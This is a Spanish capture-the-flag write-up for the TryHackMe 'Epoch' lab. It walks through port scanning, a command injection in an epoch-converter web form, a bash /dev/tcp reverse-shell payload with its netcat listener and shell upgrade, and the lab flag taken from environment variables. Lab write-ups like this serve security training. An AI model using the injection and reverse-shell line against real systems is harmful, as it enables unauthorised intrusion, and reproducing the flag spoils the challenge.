---
layout: single
title: Epoch - Tryhackme
excerpt: "El punto de entrada es el servicio web, el cual es vulnerable a una inyección de comandos, inyectamos un comando que nos envía una reverse shell a nuestro equipo y ganamos acceso a la máquina víctima"
date: 2023-01-11
classes: wide
header:
  teaser: /assets/images/tryhackme-writeup-epoch/1f93210b470f836c38121fc3f65c0807.png
  teaser_home_page: true
  icon: /assets/images/tryhackme_logo.svg
categories:
  - tryhackme
tags:
  - linux
  - fácil
  - command inyection
---

<p align="center">
  <img width="460" height="300" src="/assets/images/tryhackme-writeup-epoch/1f93210b470f836c38121fc3f65c0807.png">
</p>

El punto de entrada es el servicio web, el cual es vulnerable a una inyección de comandos, inyectamos un comando que nos envía una reverse shell a nuestro equipo y ganamos acceso a la máquina víctima

## Resumen

- El aplicativo web es vulnerable a una inyección de comandos, desde la cual, ganamos acceso a la máquina víctima mediante un reverse shell

## Escaneo de puertos

```
# sudo nmap --min-rate 5000 -p- --open -sS -Pn -n -v 10.10.32.171 -oG openPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 17:27 CET
Initiating SYN Stealth Scan at 17:27
Scanning 10.10.32.171 [65535 ports]
Discovered open port 80/tcp on 10.10.32.171
Discovered open port 22/tcp on 10.10.32.171
Completed SYN Stealth Scan at 17:28, 12.25s elapsed (65535 total ports)
Nmap scan report for 10.10.32.171
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# nmap -sV -sV -p22,80 10.10.32.171 -oN services
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 17:28 CET
Nmap scan report for 10.10.32.171
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=1/12%Time=63C03536%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,529,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2012\x20Jan\x20202
SF:3\x2016:28:37\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x201184\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n\n<head>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"ht
SF:tps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min
SF:\.css\"\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\"sha384-JcKb8q3iqJ6
SF:1gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\"\x20crossorigin
SF:=\"anonymous\">\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20}\n\x20\x20\x20\x20</style>\n</head>\n\n<body>\n\x20\x20\x20\x
SF:20<div\x20class=\"container\x20h-100\">\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<div\x20class=\"row\x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<div\x20class=\"col-12\x20mb-4\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\"text-center\">Epo
SF:ch\x20to\x20UTC\x20convertor\x20\xe2\x8f\xb3</h3>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<form\x20class=\"col-6\x20mx-auto\"\x20action=\"/\">\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20cla
SF:ss=\"\x20input-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"epoch\"\x20value=\"\
SF:"\x20type=\"text\"\x20class=\"form-control\"\x20placeholder=\"Epoch\"\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0")%r(HTTPOptions,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nD
SF:ate:\x20Thu,\x2012\x20Jan\x202023\x2016:28:37\x20GMT\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GE
SF:T,\x20HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed")%r(
SF:RTSPRequest,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x
SF:20Thu,\x2012\x20Jan\x202023\x2016:28:37\x20GMT\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20
SF:HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración web

Al acceder al servicio web nos encontramos esto

![](/assets/images/tryhackme-writeup-epoch/Pasted image 20230112173127.png)

La página web permite inyecciones de comandos

![](/assets/images/tryhackme-writeup-epoch/Pasted image 20230112175133.png)

Nos entablamos una reverse shell ejecutando el siguiente comando

```
;bash -i >& /dev/tcp/10.8.58.58/8080 0>&1
```

Recibimos la reverse shell y hacemos un tratamiento a la tty

```
# nc -nlvp 8080                                 
listening on [any] 8080 ...
connect to [10.8.58.58] from (UNKNOWN) [10.10.32.171] 37062
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@e7c1352e71ec:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
challenge@e7c1352e71ec:~$ ^Z
zsh: suspended  nc -nlvp 8080

stty raw -echo; fg                                                           
[1]  + continued  nc -nlvp 8080
                               reset xterm

challenge@e7c1352e71ec:~$ export TERM=xterm
challenge@e7c1352e71ec:~$ export SHELL=bash
challenge@e7c1352e71ec:~$ stty rows 49 columns 184
```

Imprimimos las variables de entorno y obtenemos la flag

```
challenge@e7c1352e71ec:~$ printenv
SHELL=bash
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
TERM=xterm
SHLVL=3
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/printenv
OLDPWD=/home
```
